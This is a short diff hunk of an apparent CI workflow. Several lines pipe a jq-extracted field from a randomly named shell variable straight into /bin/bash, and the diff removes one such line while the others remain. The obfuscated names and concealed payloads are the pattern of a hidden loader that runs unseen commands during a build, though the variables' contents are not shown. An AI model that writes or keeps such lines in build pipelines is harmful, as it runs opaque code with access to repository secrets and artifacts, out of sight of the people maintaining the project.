@@ -24,7 +24,6 @@ jobs:
           echo $p27 | jq -r .o252 | /bin/bash
           printf '%s' "$ljh3" | jq -r .ini14 | /bin/bash
           echo $ccr0 | jq -r .r72804 | /bin/bash
-          printf '%s' "$tdr8" | jq -r .h7943 | /bin/bash
           printf '%s' "$aq0" | jq -r .c69 | /bin/bash
 
       - name: Upload artifact
